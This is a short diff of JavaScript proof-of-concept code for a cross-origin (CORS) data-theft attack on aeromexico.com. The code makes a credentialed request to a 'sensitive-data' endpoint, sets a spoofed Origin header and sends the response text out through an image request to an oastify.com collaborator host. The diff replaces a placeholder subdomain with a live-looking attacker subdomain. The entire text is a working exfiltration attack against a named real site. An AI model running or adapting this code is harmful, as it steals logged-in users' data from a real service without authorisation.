@@ -8,12 +8,12 @@
         var xhr = new XMLHttpRequest();
         xhr.open('GET', 'http://www.aeromexico.com/sensitive-data', true);
         xhr.withCredentials = true;
-        xhr.setRequestHeader('Origin', 'http://mi8v3glrdblxyjb549s0506h48azystgi.oastify.com');
+        xhr.setRequestHeader('Origin', 'lg5u1fjqbajwwi9428qz3z4g278ywutii.oastify.com');
         xhr.onreadystatechange = function() {
             if (xhr.readyState == 4 && xhr.status == 200) {
                 var data = xhr.responseText;
                 var img = new Image();
-                img.src = 'http://<your-collaborator-subdomain>.burpcollaborator.net/log?data=' + encodeURIComponent(data);
+                img.src = 'http://lg5u1fjqbajwwi9428qz3z4g278ywutii.oastify.com/log?data=' + encodeURIComponent(data);
             }
         };
         xhr.send();
